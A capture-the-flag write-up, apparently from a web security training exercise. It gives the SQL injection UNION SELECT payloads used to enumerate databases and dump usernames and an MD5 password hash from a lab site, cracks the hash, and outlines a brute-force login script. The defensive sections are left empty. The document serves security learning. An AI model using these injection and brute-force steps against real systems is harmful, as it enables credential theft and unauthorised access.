# a01 + a05

## How to find the flag:
* Display all the tables of the databases with : `105 OR 1=1 UNION SELECT table_name, column_name FROM information_schema.columns`

* Discover a table named `db_default` which contains three columns : `id, username, password`

* Try to view its content with the following SQL command `105 OR 1=1 UNION SELECT username, 1 FROM db_default`.
It will return this error message : `Table 'Member_Sql_Injection.db_default' doesn't exist.`
    * We understand that it looks for the content of `db_default` in the wrong database.
    * We now need to find in which database `db_default` is stored

* Use this command to show all the tables and their databases : `105 OR 1=1 UNION SELECT table_schema, table_name FROM information_schema.tables`.
    * We now know that `db_default` is part of the `Member_Brute_Force` database

* List all the usernames of db_default : `105 OR 1=1 UNION SELECT username, 1 FROM Member_Brute_Force.db_default`
    * We find two candidates : admin and root

* List all the password of db_default : `105 OR 1=1 UNION SELECT password, 1 FROM Member_Brute_Force.db_default`
    * We find hashed data for one specific password : `3bf1114a986ba87ed28fc1b5884fc2f8`
    * We don't know if it is for admin or root yet, so we'll try both.

* But first we need to decode it. 
    * There's 32 characters so it is probably hashed in MD5.
    * It is ! The password is `shadow`

However, as the password is stored in Member_Brute_Force we suspect that we need to specificly use a brute force method to retrieve it.
In order to do this we wrote a short script in Python using a dictionnary of most common used passwords as a source. 

We then check if the word `flag` is present in the response of the reconstructed URL.

`full_url = f"{BASE_URL}&username={USERNAME}&password={password}&Login=Login#"`

* We can now go to the Signin page and log in with :
    * Username : admin
    * Password : shadow

## Risks:


## How to avoid:


Sources:
* https://owasp.org/Top10/fr/A03_2021-Injection/
* https://www.vaadata.com/blog/fr/injections-sql-principes-impacts-exploitations-bonnes-pratiques-securite/
* https://www.sqlinjection.net/table-names/
* https://www.sqlinjection.net/column-names/
* https://www.acunetix.com/websitesecurity/sql-injection/